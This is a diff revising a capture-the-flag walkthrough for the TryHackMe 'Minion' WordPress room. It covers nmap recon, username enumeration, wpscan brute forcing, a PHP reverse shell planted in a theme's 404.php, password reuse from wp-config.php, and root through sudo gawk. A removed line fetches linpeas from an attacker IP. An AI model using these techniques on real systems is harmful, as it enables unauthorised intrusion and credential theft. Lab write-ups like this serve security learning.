@@ -1,30 +1,35 @@
+---
+cover: ../.gitbook/assets/minion cover.png
+coverY: 0
+---
+
 # Minion
 
 ## Setup
 
 * Add minion.thm to /etc/hosts: `sudo nano /etc/hosts` Add in `<TARGETIP> minion.thm` as a new line in the file
 
-> \>! spoiler
-
-
-
-
-
 !\[\[Pasted image 20220923065821.png]]
 
-* Optional: I like to add the save the target IP as a variable TGT which can be used in commands and save having to type it out each time. Also makes copying commands from my notes a lot easier.
+* Optional: I like to save the target IP as a variable called TGT which can be used in commands and save having to type it out each time. Also makes copying commands from my notes a lot easier
 
 !\[\[Pasted image 20220923065906.png]]
 
 ## 1. Recon and Enumeration
 
-### 1a. nmap
+### 1.1 nmap
 
-Use nmap tool to start to built up a picture of what is running on the machine: Note: $TGT sudo nmap -A -T4 -p- $TGT Options explained: -A runs Version detection as well as default set of scripts -T4 is the timing template to use (0: slowest, 5: quickest) -p- scan all ports Nmap results: !\[\[Pasted image 20220923070212.png]]
+Use nmap tool to start to built up a picture of what is running on the machine: Note: $TGT is the target machine IP as described in the setup section
 
-Points of interest from results: Web service running on port 80: Apache 2.4.41 robots.txt file WordPress 6.0.2 /wp-admin/ (admin page?)
+`sudo nmap -A -T4 -p- $TGT`
 
-## 1b. View website
+Options explained: -A runs Version detection as well as default set of scripts -T4 is the timing template to use (0: slowest, 5: quickest) -p- scan all ports
+
+Nmap results: !\[\[Pasted image 20220923070212.png]]
+
+Points of interest from results: Web service running on port 80: Apache 2.4.41 There is a robots.txt file WordPress V 6.0.2 /wp-admin/ (WordPress admin area)
+
+## 1.2 View website
 
 We can navigate to the website in browser either using the target IP `http://<TGTIP>` or by using the hostname we saved in /etc/hosts `http://minion.thm`
 
@@ -36,57 +41,65 @@ Following the link to the Flag 1 post there is a mention of the author "minion" 
 
 There is also a comment section at the bottom of the page. I made note of this incase it could be used in the exploitation phase for possible XSS. http://minion.thm/2022/09/18/flag1/
 
-I did not find any more interesting pages browsing through the site so will move on at this point.
+I did not any more pages of notable importance browsing through the site so I chose to move on at this point.
 
-Our nmap results showed from the robots.txt file that /wp-login/ is to be ignored by web crawlers. This is sometimes a clue for where to find sensitive information on websites so it is worth taking note. robots.txt can be viewed in the browser or using commands such as curl and is often worth checking out.
+Our nmap results showed from the robots.txt file that /wp-login/ is to be ignored by web crawlers. This is sometimes a clue for where to find sensitive information on websites so it is worth taking note as well as wordpress sites commonly using this as an admin area.
 
-!\[\[Pasted image 20220921073901.png]] One extra piece of information we can gather from viewing robot.txt is that the site appears to be running PHP.
+robots.txt can be viewed in the browser or using commands such as curl and is often worth checking out.
+
+!\[\[Pasted image 20220921073901.png]] From viewing robots.txtwe can see the site appears to be running PHP as well as giving us a link to a sitemap. Browsing to the sitemap and following the users link we can see another mention of the user "minion" if we had missed it before
+
+!\[\[Pasted image 20220923205144.png]]
 
 We can view the disallowed page by navigating to it directly in the browser where we find we get redirected to a login page !\[\[Pasted image 20220921074117.png]]
 
 ## 2. Exploitation
 
-Comments Section I first looked to see if the comments section was vulnerable to XSS by adding a test comment !\[\[Pasted image 20220921122515.png]] !\[\[Pasted image 20220921122530.png]] HTML tags got removed in preview. Comment is awaiting approval
+My first process was to try and use XSS in the comments section, however, comments require admin approval before they will be dispalyed properly.
 
-Login page To see how the page responds to input we can try credentials we do not think will work test:test !\[\[Pasted image 20220921122821.png]]
+### 2.1 Login page
+
+To see how the page responds to input we can try credentials we do not think will work test:test !\[\[Pasted image 20220921122821.png]]
 
 Error shows no username "test" registered. This is a useful error message compared to a typical "user and/or password incorrect" seen on most site as we can identify if a username is valid without knowing the password.
 
-We can try common usernames (root, admin) and we also can try 'minion' (the author of the flag post)
+We can try common usernames (root, admin) and also 'minion' (the author of the flag post)
 
-Entering Minion gives a different error message that the password is incorrect but confirms the username exists
+Entering Minion gives a different error message that the password is incorrect but confirms the username exists.
 
 !\[\[Pasted image 20220923070812.png]]
 
-Brute force login with WPSCAN http://minion.thm/wp-login.php
+Brute forcing the login can be acheived with a number of tools. I used burpsuite at first but with the delayewd response time form the site I changed over to use WPScan
 
-Using our found valid username "minion" we can try to brute force the login. Originally I tried with max-threads set to 40 but it was timing out and eventually got the command to work at 5, which is the default amount if the options is not used.
+#### WPScan
 
-wpscan --url http://minion.thm/wp-login.php --usernames minion --passwords /usr/share/wordlists/rockyou.txt --max-threads 5 !\[\[Pasted image 20220921133836.png]] Password successfully found minion : yellow
+Using our found valid username "minion" we can try to brute force the login. At first I set max-threads set to 40 but it was timing out and eventually got the command to work at 5, which is the default amount if the options is not used.
 
-```bash
-// Some code
+Command:
+
 ```
+wpscan --url http://minion.thm/wp-login.php --usernames minion --passwords /usr/share/wordlists/rockyou.txt --max-threads 5
+```
+
+!\[\[Pasted image 20220921133836.png]] Password successfully found so we now have valid login credentials minion : yellow
 
 ## 3. Post Compromise Enumeration
 
-### 3a Wordpress User Compromise
+### 3.1 Wordpress User Compromise
 
-Comment awaiting approval !\[\[Pasted image 20220921133914.png]]
+Once we logon we can see that comments awaiting approval if any were made !\[\[Pasted image 20220921133914.png]]
 
-Sample page XSS Once comments are approved XSS is found to be working
-
-alert('XSS');
-
-!\[\[Pasted image 20220921134352.png]]
+Approving the comments and going back to the post page shows XSS to be working but I did not explore this route any further
 
 !\[\[Pasted image 20220921134339.png]]
 
-As we know the site runs PHP my focus turned to finding somewhere that a PHP shell could be upladed to.
+### 3.2 PHP Reverse Shell
 
-Originally I tried in the uplaod media section but .php extensions are not allowed and file signatures are checked as renaming the extension is still found to be invalid.
+As we know the site runs PHP (Wordpress sites almost always run PHP and robot.txt lists a .php file) my focus turned to finding somewhere that a PHP shell could be upladed to.
 
-From previous experience I have known there to be .php files in the theme files so I looked in here. The theme in use contained .html files, however other themes were available and browsing to TWENTY TWENTY-ONE theme found the desired .php extension filenames.
+Originally I tried in the upload media section but .php extensions are not allowed and file signatures are checked as renaming the extension was still found to be invalid.
+
+From previous experience I have known there to be .php files in the theme files so I looked in here. The theme in use contained .html files, however other themes were available and browsing to TWENTY TWENTY-ONE theme found the desired .php extension files.
 
 !\[\[Pasted image 20220923070956.png]]
 
@@ -94,17 +107,23 @@ From previous experience I have known there to be .php files in the theme files 
 
 I decided to use the 404 file as it can reliably be called upon by browsing to page that doesn't exist.
 
-I inserted the well known PHP shell from pentestmonkey which can be found at: https://github.com/pentestmonkey/php-reverse-shell changing the ip and port number to match my workstation and the netcat listener I set up choosing a high value port: !\[\[Pasted image 20220923071246.png]] Once the PHP is pasted in and the port and IP values are set appropriately click the update file button underneath to save the changes !\[\[Pasted image 20220923071425.png]]
+I inserted the well known PHP shell from pentestmonkey which can be found at: https://github.com/pentestmonkey/php-reverse-shell making sure to change the ip and port number to match my workstation and the netcat listener I set up. !\[\[Pasted image 20220923071246.png]] !\[\[Pasted image 20220923071319.png]]
 
-!\[\[Pasted image 20220923071319.png]]
+Once the PHP is pasted in and the port and IP values are set appropriately click the update file button underneath to save the changes !\[\[Pasted image 20220923071425.png]]
 
-Now that the PHP shell code exists in the theme we can activate it in the wordpress dashboard !\[\[Pasted image 20220923071549.png]] !\[\[Pasted image 20220923071607.png]] and browse to a URL that will return the 404 code
+Now that the PHP shell code exists in the TWENTY TWENTY-ONE theme it needs to be activated which can be done through the dashboard.
 
-http://minion.thm/abunchofrandomcaharactersshouldworkaljkdkasdbbb This shoudl cause the page to "hang" as we now have a web shell established as www-data !\[\[Pasted image 20220923071642.png]]
+!\[\[Pasted image 20220923071549.png]] !\[\[Pasted image 20220923071607.png]]
 
-### 3 b. Web Shell
+Browsing to a URL that doesn't exist (e.ghttp://minion.thm/NotAPagelllasdbbb) will return the desired 404 response code leading to the themes 404.php being loaded
 
-It is not neccessary but makes life a lot easier if you stabalise your shell: Stabalise shell
+If e payload is executed properly this will cause the page to "hang" as we now have a web shell established as www-data !\[\[Pasted image 20220923071642.png]]
+
+### 3.3 Enumeration with established shell
+
+It is not neccessary but it makes life a lot easier if you stabalise your shell:
+
+#### Stabalise the shell
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -121,39 +140,58 @@ This does two things: first, it turns off our own terminal echo (which gives us 
 
 If shell dies and cannot see typed stuff use command `reset`
 
+With the shell stabalised I started to gather information:
+
 /etc/passwd !\[\[Pasted image 20220923074813.png]]
 
 ls /home !\[\[Pasted image 20220923074905.png]]
 
-find / -type f -name "Flag\*" 2>/dev/null
+This shows two users of interest: Gru and Minion.
 
-!\[\[Pasted image 20220921172623.png]]
+Looking back at the THM room we are in search of flags so I ran a find to check for accessible flags: find / -type f -name "flag\*" 2>/dev/null which didn't return any useful results so I used -iname to make the search case insensitive picking up the next challenge flag find / -type f -iname "flag\*" 2>/dev/null
 
-wp-config.php !\[\[Pasted image 20220923075130.png]]
+The available flag is in /srv/www/wordpress alongside other files from the minion.thm site
+
+Looking into the files gives database information in wp-config.php One line that stands out is define( 'DB\_PASSWORD', 'SuperDuperStrongPasswordThatIsLong' );
+
+!\[\[Pasted image 20220923075130.png]]
 
 ## 4 Priv esc
 
-su minion Password reuse
+After not finding any SUID files or cron jobs in /etc/crontab to use for priviliege escalation I decided to try and move across to the minion user hoping that the password we found on the wordpress site had been reused Command:
 
-wget 10.14.23.1:8080/linpeas.sh
-
-╔══════════╣ Analyzing Wordpress Files (limit 70) -rw-r--r-- 1 www-data www-data 3194 Sep 18 23:27 /srv/www/wordpress/wp-config.php\
-define( 'DB\_NAME', 'wordpress' ); define( 'DB\_USER', 'wordpress' ); define( 'DB\_PASSWORD', 'SuperDuperStrongPasswordThatIsLong' ); define( 'DB\_HOST', 'localhost' );
-
-SUID files sudo -l dont have password
-
+```
 su minion
+Password: yellow
+```
 
-!\[\[Pasted image 20220923075231.png]] !\[\[Pasted image 20220923075255.png]] sudo -l !\[\[Pasted image 20220923075325.png]]
+!\[\[Pasted image 20220923075231.png]]
 
-cat /etc/crontab
+SUCCESS as well as access to a flag there is also a file called "notes"
 
-priv esc suid
+!\[\[Pasted image 20220923075255.png]]
 
-su gru !\[\[Pasted image 20220923075422.png]]
+I checked if minion had any sudo rights but no luck here !\[\[Pasted image 20220923075325.png]]
 
-!\[\[Pasted image 20220923075457.png]] GTFO bins
+So using the info from "notes" it follows to move across to the other user Gru. Trying the database password from wp-config.php:
 
-!\[\[Pasted image 20220923075604.png]]
+```
+su gru
+Password: SuperDuperStrongPasswordThatIsLong
+```
 
-!\[\[Pasted image 20220923075624.png]]
+!\[\[Pasted image 20220923075422.png]]
+
+gives the next challenge flag in Gru's home folder. Checking for sudo rights this time returns the ability to run gawk as sudo.
+
+!\[\[Pasted image 20220923075457.png]]
+
+Checking GTFO bins https://gtfobins.github.io/gtfobins/gawk/#sudo shows us a command that can be used to elevate to privileged access:
+
+```
+sudo gawk 'BEGIN {system("/bin/sh")}'
+```
+
+!\[\[Pasted image 20220923075604.png]] Now that we have a root shell we can find the rooms final flag in the /root folder.
+
+Thanks for reading my writeup of the Minion room.
